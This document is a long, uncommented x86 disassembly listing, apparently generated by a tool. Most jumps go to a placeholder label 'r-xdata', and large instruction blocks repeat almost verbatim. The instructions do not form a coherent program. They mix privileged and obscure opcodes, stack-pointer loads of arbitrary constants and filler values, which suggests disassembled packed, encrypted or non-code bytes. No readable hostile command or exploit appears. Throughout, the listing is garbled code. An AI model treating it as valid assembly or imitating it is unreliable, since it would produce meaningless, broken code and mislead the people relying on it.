push ecx
jpo r-xdata
inc edx
jmp r-xdata
jmp r-xdata
push [ edx + 0x7b452f92 ]
jpo r-xdata
adc [ edi - 0x6e ] edi
salc
jpo r-xdata
jpo r-xdata
xchg edx eax
adc [ edx + 0x7b ] 0xebebeb7b
sbb eax 0x92b32ef2
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
outsb
inc ebp
jpo r-xdata
std
mov ebx 0x927b7b7b
jmp r-xdata
jmp r-xdata
jmp r-xdata
sbb eax 0x23a73ef2
adc [ 0xfffffffff21d83f0 ] ecx
jmp r-xdata
push edx
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov al [ esi - 0x6c147b7c ]
xchg edx eax
stc
push es
movsd [ edi ] [ esi ]
cmpsd [ esi ] [ edi ]
and edx [ ecx ]
or eax 0xf21d83f0
and edx [ edx + 0x7b7b6403 ]
jmp r-xdata
jpo r-xdata
test [ ebx ] ch
sub [ esp + ebp - 0x54310d91 ] al
jmp r-xdata
xchg ebp eax
xchg edx eax
jpo r-xdata
shr [ esi + 0x7b ] 0x1
jpo r-xdata
test bl ch
xchg ebx eax
mov edi 0x5d50926b
test [ esp + eax * 4 - 0x7bb26dd5 ] al
test [ ebx + ebp * 8 - 0x4d141415 ] al
mov eax 0xebebebeb
jmp r-xdata
jmp r-xdata
jpo r-xdata
sub [ 0x7b6bd692 ] ch
test [ edi + edi * 8 + 0x4a ] dh
cmp eax 0xb2487b7b
jmp r-xdata
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
jpo r-xdata
mov bh 0x8f
test [ ebx + ebp * 8 - 0x6d141415 ] al
add al 0x7b
jpo r-xdata
ja r-xdata
jmp r-xdata
je r-xdata
and dh [ edx - 0x14141448 ]
jmp sub_4782bc
xchg edx eax
fidiv [ edx ]
jpo r-xdata
mov al [ esp + eax * 4 - 0x72c10de3 ]
xchg edx eax
cmp [ edi + 0x7b ] bh
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
jmp r-xdata
idiv [ esi ]
ja r-xdata
mov dl 0x42
cmp [ ebx + 0x7b ] 0x7b
jae r-xdata
xchg edx eax
out dx al
cmp edi [ ebx + 0x7b ]
sbb eax 0x7b3d00f8
test [ edi + 0x78 ] 0x92
jmp r-xdata
jmp r-xdata
adc ecx [ edx - 0xde27b7c ]
lea edx [ edx + 0x7b7b7f38 ]
jl r-xdata
push cs
imul edx [ edx + 0x7b7b40cb ] 0xffffffeb
jmp r-xdata
jpo r-xdata
inc edi
js r-xdata
xchg [ esp + eax * 4 - 0x18b4402 ] al
jno r-xdata
into
stosd [ edi ]
jpo r-xdata
jpo r-xdata
and edi [ ebx + edi * 2 + 0x7b ]
test [ esi ] cl
test [ ebx + ebp * 8 - 0x5008b15 ] al
pop ds
xor bh [ ebx + 0x7b ]
xchg edx eax
pop ecx
jpo r-xdata
pop edi
jmp r-xdata
jpo r-xdata
push cs
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
jpo r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
je r-xdata
jo r-xdata
cli
sub_47805b
mov ebx 0x5561ff74
jpo r-xdata
cmp eax 0xebeb7b7b
dec eax
test [ eax ] ch
cmp al 0x92
jo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
stosb [ edi ]
pop ecx
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub eax 0x7b6bd692
jmp r-xdata
dec esi
jpo r-xdata
adc bh [ ebx + 0x7b7b7bff ]
js r-xdata
jmp r-xdata
and [ edi + 0x7b ] esp
jpo r-xdata
je r-xdata
jmp r-xdata
cmpsd [ esi ] [ edi ]
inc eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x927b7b7b
xchg ebx eax
out 0x61 al
jpo r-xdata
mov dl 0xb8
jmp r-xdata
jpo r-xdata
pop esp
push ecx
inc edx
jmp r-xdata
lea edx [ edx + 0x7b7b7f38 ]
adc [ edi + 0x1d ] ebp
sbb [ 0xffffffff929536f2 ] 0x13
std
jpo r-xdata
jmp r-xdata
xchg esi eax
cmp edi [ ebx + 0x7b ]
xchg ebx eax
sub [ edx ] esi
jpo r-xdata
xchg edx eax
sub eax 0xf87b7b7c
mov bl 0x84
mov eax 0xebebebeb
jmp r-xdata
jmp r-xdata
push [ edx + 0x7b452f92 ]
jpo r-xdata
adc [ edi - 0x6e ] edi
salc
jpo r-xdata
jpo r-xdata
xchg edx eax
adc [ edx + 0x7b ] 0xebebeb7b
sbb eax 0x92b32ef2
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
outsb
inc ebp
jpo r-xdata
test [ esi ] cl
mov al [ esp + eax * 4 - 0x72c10de3 ]
xchg edx eax
cmp [ edi + 0x7b ] bh
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
sbb [ 0xffffffff929536f2 ] 0x13
jmp r-xdata
test [ ebx ] ch
sub [ esp + ebp - 0x54310d91 ] al
jmp r-xdata
jmp r-xdata
clc
mov edi 0xaf3ef677
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
sbb eax 0x23a73ef2
adc [ 0xfffffffff21d83f0 ] ecx
jmp r-xdata
push edx
jpo r-xdata
jmp r-xdata
cmp [ ebx + 0x7b ] 0x7b
jae r-xdata
adc ecx [ edx - 0xde27b7c ]
lea edx [ edx + 0x7b7b7f38 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
sub eax [ ebp + ecx - 0x50d90dd5 ]
xchg edx eax
or eax 0xeb7b7b3d
jmp r-xdata
scasd [ edi ]
jpo r-xdata
mov al [ esi - 0x6c147b7c ]
xchg edx eax
stc
push es
movsd [ edi ] [ esi ]
cmpsd [ esi ] [ edi ]
and edx [ ecx ]
or eax 0xf21d83f0
and edx [ edx + 0x7b7b6403 ]
jmp r-xdata
jpo r-xdata
jl r-xdata
push cs
imul edx [ edx + 0x7b7b40cb ] 0xffffffeb
jmp r-xdata
je r-xdata
and dh [ edx - 0x14141448 ]
jmp sub_4782bc
xchg edx eax
fidiv [ edx ]
jpo r-xdata
xchg ebp eax
xchg edx eax
jpo r-xdata
shr [ esi + 0x7b ] 0x1
jpo r-xdata
test bl ch
xchg ebx eax
mov edi 0x5d50926b
test [ esp + eax * 4 - 0x7bb26dd5 ] al
test [ ebx + ebp * 8 - 0x4d141415 ] al
mov eax 0xebebebeb
jmp r-xdata
jmp r-xdata
jpo r-xdata
sub [ 0x7b6bd692 ] ch
test [ edi + edi * 8 + 0x4a ] dh
cmp eax 0xb2487b7b
jpo r-xdata
jpo r-xdata
and edi [ ebx + edi * 2 + 0x7b ]
out dx al
cmp edi [ ebx + 0x7b ]
sbb eax 0x7b3d00f8
test [ edi + 0x78 ] 0x92
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov bh 0x8f
test [ ebx + ebp * 8 - 0x6d141415 ] al
add al 0x7b
jpo r-xdata
ja r-xdata
jmp r-xdata
pop edi
jmp r-xdata
jpo r-xdata
push cs
jpo r-xdata
inc edi
js r-xdata
xchg [ esp + eax * 4 - 0x18b4402 ] al
jno r-xdata
into
stosd [ edi ]
idiv [ esi ]
ja r-xdata
mov dl 0x42
xchg edx eax
test [ ebx + ebp * 8 - 0x5008b15 ] al
pop ds
xor bh [ ebx + 0x7b ]
xchg edx eax
pop ecx
jpo r-xdata
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
jpo r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
je r-xdata
jo r-xdata
cli
sub_4780a5
sub al 0x93
cmp ecx [ edx - 0x556d7b7c ]
pop ecx
jpo r-xdata
sub eax 0x7b6bd692
jmp r-xdata
and [ edi + 0x7b ] esp
jpo r-xdata
je r-xdata
jmp r-xdata
mov dl 0xb8
jmp r-xdata
jpo r-xdata
pop esp
push ecx
jpo r-xdata
inc edx
jmp r-xdata
jmp r-xdata
push [ edx + 0x7b452f92 ]
jpo r-xdata
adc [ edi - 0x6e ] edi
salc
jpo r-xdata
jpo r-xdata
xchg edx eax
adc [ edx + 0x7b ] 0xebebeb7b
sbb eax 0x92b32ef2
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
outsb
inc ebp
jpo r-xdata
std
mov ebx 0x927b7b7b
jmp r-xdata
jmp r-xdata
jmp r-xdata
sbb eax 0x23a73ef2
adc [ 0xfffffffff21d83f0 ] ecx
jmp r-xdata
push edx
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov al [ esi - 0x6c147b7c ]
xchg edx eax
stc
push es
movsd [ edi ] [ esi ]
cmpsd [ esi ] [ edi ]
and edx [ ecx ]
or eax 0xf21d83f0
and edx [ edx + 0x7b7b6403 ]
jmp r-xdata
jpo r-xdata
test [ ebx ] ch
sub [ esp + ebp - 0x54310d91 ] al
jmp r-xdata
xchg ebp eax
xchg edx eax
jpo r-xdata
shr [ esi + 0x7b ] 0x1
jpo r-xdata
test bl ch
xchg ebx eax
mov edi 0x5d50926b
test [ esp + eax * 4 - 0x7bb26dd5 ] al
test [ ebx + ebp * 8 - 0x4d141415 ] al
mov eax 0xebebebeb
jmp r-xdata
jmp r-xdata
jpo r-xdata
sub [ 0x7b6bd692 ] ch
test [ edi + edi * 8 + 0x4a ] dh
cmp eax 0xb2487b7b
jmp r-xdata
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
jpo r-xdata
mov bh 0x8f
test [ ebx + ebp * 8 - 0x6d141415 ] al
add al 0x7b
jpo r-xdata
ja r-xdata
jmp r-xdata
je r-xdata
and dh [ edx - 0x14141448 ]
jmp sub_4782bc
xchg edx eax
fidiv [ edx ]
jpo r-xdata
mov al [ esp + eax * 4 - 0x72c10de3 ]
xchg edx eax
cmp [ edi + 0x7b ] bh
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
jmp r-xdata
idiv [ esi ]
ja r-xdata
mov dl 0x42
cmp [ ebx + 0x7b ] 0x7b
jae r-xdata
xchg edx eax
out dx al
cmp edi [ ebx + 0x7b ]
sbb eax 0x7b3d00f8
test [ edi + 0x78 ] 0x92
jmp r-xdata
jmp r-xdata
adc ecx [ edx - 0xde27b7c ]
lea edx [ edx + 0x7b7b7f38 ]
scasd [ edi ]
sub eax [ ebp + ecx - 0x50d90dd5 ]
xchg edx eax
or eax 0xeb7b7b3d
jmp r-xdata
jl r-xdata
push cs
imul edx [ edx + 0x7b7b40cb ] 0xffffffeb
jmp r-xdata
jpo r-xdata
inc edi
js r-xdata
xchg [ esp + eax * 4 - 0x18b4402 ] al
jno r-xdata
into
stosd [ edi ]
jpo r-xdata
jpo r-xdata
and edi [ ebx + edi * 2 + 0x7b ]
test [ esi ] cl
test [ ebx + ebp * 8 - 0x5008b15 ] al
pop ds
xor bh [ ebx + 0x7b ]
xchg edx eax
pop ecx
jpo r-xdata
pop edi
jmp r-xdata
jpo r-xdata
push cs
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
jpo r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
je r-xdata
jo r-xdata
cli
sub_4780b2
sbb eax 0x3d0a6ff2
inc eax
mov edx [ edx - 0x7b7b6bc6 ]
jmp r-xdata
xchg edx eax
stosb [ edi ]
pop ecx
jpo r-xdata
sub eax 0x7b6bd692
jmp r-xdata
and [ edi + 0x7b ] esp
jpo r-xdata
je r-xdata
jmp r-xdata
mov dl 0xb8
jmp r-xdata
jpo r-xdata
pop esp
push ecx
jpo r-xdata
inc edx
jmp r-xdata
jmp r-xdata
push [ edx + 0x7b452f92 ]
jpo r-xdata
adc [ edi - 0x6e ] edi
salc
jpo r-xdata
jpo r-xdata
xchg edx eax
adc [ edx + 0x7b ] 0xebebeb7b
sbb eax 0x92b32ef2
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
outsb
inc ebp
jpo r-xdata
std
mov ebx 0x927b7b7b
jmp r-xdata
jmp r-xdata
jmp r-xdata
sbb eax 0x23a73ef2
adc [ 0xfffffffff21d83f0 ] ecx
jmp r-xdata
push edx
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov al [ esi - 0x6c147b7c ]
xchg edx eax
stc
push es
movsd [ edi ] [ esi ]
cmpsd [ esi ] [ edi ]
and edx [ ecx ]
or eax 0xf21d83f0
and edx [ edx + 0x7b7b6403 ]
jmp r-xdata
jpo r-xdata
test [ ebx ] ch
sub [ esp + ebp - 0x54310d91 ] al
jmp r-xdata
xchg ebp eax
xchg edx eax
jpo r-xdata
shr [ esi + 0x7b ] 0x1
jpo r-xdata
test bl ch
xchg ebx eax
mov edi 0x5d50926b
test [ esp + eax * 4 - 0x7bb26dd5 ] al
test [ ebx + ebp * 8 - 0x4d141415 ] al
mov eax 0xebebebeb
jmp r-xdata
jmp r-xdata
jpo r-xdata
sub [ 0x7b6bd692 ] ch
test [ edi + edi * 8 + 0x4a ] dh
cmp eax 0xb2487b7b
jmp r-xdata
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
jpo r-xdata
mov bh 0x8f
test [ ebx + ebp * 8 - 0x6d141415 ] al
add al 0x7b
jpo r-xdata
ja r-xdata
jmp r-xdata
je r-xdata
and dh [ edx - 0x14141448 ]
jmp sub_4782bc
xchg edx eax
fidiv [ edx ]
jpo r-xdata
mov al [ esp + eax * 4 - 0x72c10de3 ]
xchg edx eax
cmp [ edi + 0x7b ] bh
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
jmp r-xdata
idiv [ esi ]
ja r-xdata
mov dl 0x42
cmp [ ebx + 0x7b ] 0x7b
jae r-xdata
xchg edx eax
out dx al
cmp edi [ ebx + 0x7b ]
sbb eax 0x7b3d00f8
test [ edi + 0x78 ] 0x92
jmp r-xdata
jmp r-xdata
adc ecx [ edx - 0xde27b7c ]
lea edx [ edx + 0x7b7b7f38 ]
scasd [ edi ]
sub eax [ ebp + ecx - 0x50d90dd5 ]
xchg edx eax
or eax 0xeb7b7b3d
jmp r-xdata
jl r-xdata
push cs
imul edx [ edx + 0x7b7b40cb ] 0xffffffeb
jmp r-xdata
jpo r-xdata
inc edi
js r-xdata
xchg [ esp + eax * 4 - 0x18b4402 ] al
jno r-xdata
into
stosd [ edi ]
jpo r-xdata
jpo r-xdata
and edi [ ebx + edi * 2 + 0x7b ]
test [ esi ] cl
test [ ebx + ebp * 8 - 0x5008b15 ] al
pop ds
xor bh [ ebx + 0x7b ]
xchg edx eax
pop ecx
jpo r-xdata
pop edi
jmp r-xdata
jpo r-xdata
push cs
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
jpo r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
je r-xdata
jo r-xdata
cli
sub_478124
cli
xchg edi eax
arpl [ eax + 0x7b ] di
adc [ edi - 0x6e ] edi
salc
jpo r-xdata
sub eax 0x7b6bd692
jmp r-xdata
jmp r-xdata
and [ edi + 0x7b ] esp
jpo r-xdata
je r-xdata
mov al [ esi - 0x6c147b7c ]
xchg edx eax
stc
mov dl 0xb8
jmp r-xdata
jpo r-xdata
pop esp
push ecx
jpo r-xdata
shr [ esi + 0x7b ] 0x1
jpo r-xdata
test bl ch
xchg ebx eax
mov edi 0x5d50926b
test [ esp + eax * 4 - 0x7bb26dd5 ] al
test [ ebx + ebp * 8 - 0x4d141415 ] al
mov eax 0xebebebeb
jmp r-xdata
jmp r-xdata
jmp r-xdata
push [ edx + 0x7b452f92 ]
jpo r-xdata
jpo r-xdata
xchg edx eax
adc [ edx + 0x7b ] 0xebebeb7b
sbb eax 0x92b32ef2
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
ja r-xdata
jmp r-xdata
std
mov ebx 0x927b7b7b
jmp r-xdata
sbb eax 0x23a73ef2
adc [ 0xfffffffff21d83f0 ] ecx
jmp r-xdata
push edx
jpo r-xdata
cmp [ ebx + 0x7b ] 0x7b
jae r-xdata
xchg edx eax
jpo r-xdata
jpo r-xdata
push es
movsd [ edi ] [ esi ]
cmpsd [ esi ] [ edi ]
and edx [ ecx ]
or eax 0xf21d83f0
and edx [ edx + 0x7b7b6403 ]
jmp r-xdata
jl r-xdata
push cs
imul edx [ edx + 0x7b7b40cb ] 0xffffffeb
jmp r-xdata
test [ ebx ] ch
sub [ esp + ebp - 0x54310d91 ] al
jmp r-xdata
xchg ebp eax
xchg edx eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
sub [ 0x7b6bd692 ] ch
jpo r-xdata
jpo r-xdata
and edi [ ebx + edi * 2 + 0x7b ]
test [ esi ] cl
jmp r-xdata
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
jpo r-xdata
mov bh 0x8f
test [ ebx + ebp * 8 - 0x6d141415 ] al
add al 0x7b
jpo r-xdata
pop edi
jmp r-xdata
jpo r-xdata
push cs
je r-xdata
and dh [ edx - 0x14141448 ]
jmp sub_4782bc
xchg edx eax
fidiv [ edx ]
jpo r-xdata
mov al [ esp + eax * 4 - 0x72c10de3 ]
xchg edx eax
cmp [ edi + 0x7b ] bh
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
jmp r-xdata
idiv [ esi ]
mov dl 0x42
out dx al
cmp edi [ ebx + 0x7b ]
sbb eax 0x7b3d00f8
test [ edi + 0x78 ] 0x92
jmp r-xdata
jmp r-xdata
adc ecx [ edx - 0xde27b7c ]
lea edx [ edx + 0x7b7b7f38 ]
scasd [ edi ]
sub eax [ ebp + ecx - 0x50d90dd5 ]
xchg edx eax
or eax 0xeb7b7b3d
jmp r-xdata
outsb
inc ebp
jpo r-xdata
jpo r-xdata
inc edi
js r-xdata
xchg [ esp + eax * 4 - 0x18b4402 ] al
jno r-xdata
into
stosd [ edi ]
jmp r-xdata
test [ ebx + ebp * 8 - 0x5008b15 ] al
pop ds
xor bh [ ebx + 0x7b ]
xchg edx eax
pop ecx
jpo r-xdata
jpo r-xdata
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
jpo r-xdata
ja r-xdata
test [ edi + edi * 8 + 0x4a ] dh
cmp eax 0xb2487b7b
inc edx
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
je r-xdata
jo r-xdata
cli
sub_4781c0
mov ebx 0x84868a92
test bl ch
xchg ebx eax
mov edi 0x5d50926b
ja r-xdata
jmp r-xdata
cmp [ ebx + 0x7b ] 0x7b
jae r-xdata
shr [ esi + 0x7b ] 0x1
jpo r-xdata
xchg edx eax
mov al [ esi - 0x6c147b7c ]
jl r-xdata
push cs
imul edx [ edx + 0x7b7b40cb ] 0xffffffeb
jmp r-xdata
jpo r-xdata
jpo r-xdata
and edi [ ebx + edi * 2 + 0x7b ]
test [ esi ] cl
pop edi
jmp r-xdata
jpo r-xdata
push cs
sub_4781dc
jmp r-xdata
jmp r-xdata
xchg edx eax
mov al [ esi - 0x6c147b7c ]
shr [ esi + 0x7b ] 0x1
jpo r-xdata
test bl ch
xchg ebx eax
mov edi 0x5d50926b
ja r-xdata
cmp [ ebx + 0x7b ] 0x7b
jae r-xdata
jl r-xdata
push cs
imul edx [ edx + 0x7b7b40cb ] 0xffffffeb
jmp r-xdata
jpo r-xdata
jpo r-xdata
and edi [ ebx + edi * 2 + 0x7b ]
test [ esi ] cl
pop edi
jmp r-xdata
jpo r-xdata
push cs
sub_4781f8
xchg [ esp + eax * 4 + 0x2c84282b ] al
outsd
jmp r-xdata
jpo r-xdata
je r-xdata
and dh [ edx - 0x14141448 ]
jmp sub_4782bc
xchg edx eax
fidiv [ edx ]
jpo r-xdata
out dx al
cmp edi [ ebx + 0x7b ]
sbb eax 0x7b3d00f8
test [ edi + 0x78 ] 0x92
jmp r-xdata
jmp r-xdata
jpo r-xdata
inc edi
js r-xdata
into
stosd [ edi ]
xchg [ esp + eax * 4 - 0x18b4402 ] al
jno r-xdata
test [ ebx + ebp * 8 - 0x5008b15 ] al
pop ds
xor bh [ ebx + 0x7b ]
xchg edx eax
pop ecx
jpo r-xdata
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
jpo r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
je r-xdata
jo r-xdata
cli
sub_47822b
and ch [ ebx ]
jpo r-xdata
sbb eax 0x92733df2
mov ds [ edi + 0x7b ]
jpo r-xdata
jpo r-xdata
mov eax 0xeb7b7b6d
jmp r-xdata
test bl ch
xchg ebx eax
mov edi 0x5d50926b
test [ ebx + ebp * 8 + 0x7b6ed093 ] al
ja r-xdata
jmp r-xdata
cmp [ ebx + 0x7b ] 0x7b
jae r-xdata
shr [ esi + 0x7b ] 0x1
xchg edx eax
mov al [ esi - 0x6c147b7c ]
jl r-xdata
push cs
imul edx [ edx + 0x7b7b40cb ] 0xffffffeb
jmp r-xdata
jpo r-xdata
jpo r-xdata
and edi [ ebx + edi * 2 + 0x7b ]
test [ esi ] cl
pop edi
jmp r-xdata
jpo r-xdata
push cs
sub_478246
mov ebx 0x7c23fe74
jpo r-xdata
jmp r-xdata
test [ esi ] cl
cmp [ ebx + 0x7b ] 0x7b
jae r-xdata
jl r-xdata
push cs
imul edx [ edx + 0x7b7b40cb ] 0xffffffeb
jmp r-xdata
jpo r-xdata
jpo r-xdata
and edi [ ebx + edi * 2 + 0x7b ]
pop edi
jmp r-xdata
jpo r-xdata
ja r-xdata
push cs
jmp r-xdata
xchg edx eax
mov al [ esi - 0x6c147b7c ]
shr [ esi + 0x7b ] 0x1
jpo r-xdata
test bl ch
xchg ebx eax
mov edi 0x5d50926b
sub_478264
jmp r-xdata
jpe r-xdata
test [ eax ] ch
xchg edx eax
outsb
lea eax [ esp + eax * 4 + 0x2aebebeb ]
retn 0x7b4b
pop edi
arpl [ edi + edi + 0x3ff0675f ] ax
pop edi
inc eax
cmp [ ebx + 0x74 ] ah
stc
xor dl [ edx + 0x7b ]
jpo r-xdata
xchg edx eax

dec edx
jb r-xdata
jmp r-xdata
jpo r-xdata
pop edi
jmp r-xdata
sub_4782bc
arpl [ ecx + edi * 8 + 0x32 ] si
push edx
jpo r-xdata
ror [ ebx + 0x7b ] cl
jpo r-xdata
xchg edx eax
dec edx
jb r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop edi
aaa
sub al 0x92
xlat
r-xdata
mov eax [ 0xffffffff92bdf02b ]
0xeb7b7b41 0x401d
pop edi
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
je r-xdata
jmp r-xdata
mov ebx 0x3ef22c2d
xor edx 0x3e
out 0x6c al
jpo r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
push ecx
jpo r-xdata
xchg [ 0x228d36f2 ] ebx
jmp r-xdata
daa
pop edx
jmp r-xdata
[ edx + 0x7b7b5677 ] 0xffffffeb
jmp r-xdata
test [ ebx + ebp * 8 - 0x28020d15 ] al
insd
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
cmp dl [ ebx ]
jpo r-xdata
jmp r-xdata
adc ebx [ ecx + 0x2c2322f4 ]
std
jecxz r-xdata
jl r-xdata
and bh dh
mov ebx 0x5a10ff74
jpo r-xdata
jpo r-xdata
xchg edx eax
xchg edx eax
push esp
mov [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
adc [ ebx ] ecx
and al 0x11
or eax esi
mov esp 0x7b471992
cmpsd [ esi ] [ edi ]
test [ esp + eax * 4 - 0x14141415 ] eax
sub [ edx + 0x7b7b482c ] dl
jmp r-xdata
xchg edi eax
jmp r-xdata
jpo r-xdata
xchg ebx eax
jpo r-xdata
and eax 0x137b7b3a
jpo r-xdata
dec eax
test [ eax ] ch
cmp al 0x92
jmp r-xdata
sub [ edi + ecx + 0x2d84635f ] al
setae [ ecx - 0x77 ]
test [ esi + edi * 8 + 0x5afe74bb ] al
lea eax [ esp + eax * 4 - 0x72916dd8 ]
test [ ebx + ebp * 8 - 0x3dd51415 ] al
dec ebx
jpo r-xdata
sbb ch ch
sub eax 0x7b69d992
jpo r-xdata
jmp r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
jpo r-xdata
xlat
jpo r-xdata
and edx [ edx + 0x7b7b7f96 ]
jmp r-xdata
jmp r-xdata
xchg ebx eax
jo r-xdata
sbb eax 0x92c306f2
0x7b47
jmp r-xdata
sub eax 0x775b9236
jpo r-xdata
jpo r-xdata
mov al [ esp + eax * 4 - 0x8b1415 ]
jpo r-xdata
outsd
sub edx [ edx + 0x7b7b4bb9 ]
jmp r-xdata
[ edi ]
and dl [ edx + 0x7b7b7a8e ]
xchg edx eax
and [ esp + eax * 4 - 0x1414147c ] cl
cmp eax 0x6ef09317
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
sbb eax 0x23973ef2
adc [ 0xffffffff953ef21d ] ecx
xchg esi eax
jg r-xdata
jmp r-xdata
jpo r-xdata
push es
retn
or [ edx + 0x7b ] al
jpo r-xdata
jmp sub_47848e
idiv [ esi ]
lahf
sub edx [ edx + 0x7b7b55ee ]
std
idiv [ ebx + 0x7b ]
jpo r-xdata
test bl ch
sbb eax 0x1d873ef2
jpo r-xdata
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
aas
jmp r-xdata
mov esp 0x90bb33e
pop ss
pop ebx
mov esp 0x213b73e
or ebx [ esi ]
mov esp 0xd09ab3e
pop ebx
pop ebx
xchg ebx eax
pop eax
inc ebx
jpo r-xdata
jmp r-xdata
stosb [ edi ]
inc ecx
jpo r-xdata
xchg edx eax
rcl [ ebp - 0x449f7b7c ] 0x92
jmp r-xdata
jpo r-xdata
and edx [ ecx ]
or eax 0x953ef21d
xchg edi eax
xchg ebx eax
and [ edx + esi * 8 ] ch
std
out 0x7b eax
jpo r-xdata
adc ebx [ edx + edi + 0x13 ]
lea esp [ edx ]
inc esi
push ebp
jpo r-xdata
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
xchg ebx eax
or dl [ ebp - 0x1dd7b7c ]
mov ebx 0x337bff74
jmp r-xdata
and al 0x25
or [ eax - 0x45 ] 0x1d
mov [ ss : 0xffffffff92d33ef6 ] eax
jns r-xdata
jmp r-xdata
and dh bh
mov ebx 0x80c3ff74
test [ esi + esi * 8 + 0x3ef6a336 ] al
jmp r-xdata
je r-xdata
and edi [ ecx + 0x10 ]
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
adc eax [ ebx + edi * 2 - 0x726d8485 ]
insb
jpo r-xdata
xor esp [ eax ]
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
idiv [ esi ]
jpo r-xdata
xchg edx eax
cmp eax 0xeb848488
cli
jo r-xdata
jns r-xdata
dec esi
jpo r-xdata
jmp r-xdata
sbb eax 0x48833ef2
mov ebx 0x813ef21d
adc edi [ edi + 0x7a ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x7ea0107e
jmp sub_47871e
jmp r-xdata
jpo r-xdata
sbb eax 0xf03126f2
mov [ 0x3726f21d ] eax
sbb [ 0x203326f2 ] bl
xchg edx eax
popfd
jae r-xdata
adc [ ebx ] 0x7b7b7a7f
or [ eax - 0x45 ] 0x1d
jmp r-xdata
mov ebp 0xf013487f
xchg [ es : edx + 0x7b7b4e4e ] edx
adc [ ebx + 0x7ea0107e ] bh
sub_478319
xchg edx eax
imul ecx [ ebp + 0x7b ] 0x7b
idiv [ edi ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
je r-xdata
jmp r-xdata
mov ebx 0x3ef22c2d
xor edx 0x3e
out 0x6c al
jpo r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
push ecx
jpo r-xdata
xchg [ 0x228d36f2 ] ebx
jmp r-xdata
daa
pop edx
jmp r-xdata
[ edx + 0x7b7b5677 ] 0xffffffeb
jmp r-xdata
test [ ebx + ebp * 8 - 0x28020d15 ] al
insd
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
cmp dl [ ebx ]
jpo r-xdata
jmp r-xdata
adc ebx [ ecx + 0x2c2322f4 ]
std
jecxz r-xdata
jl r-xdata
and bh dh
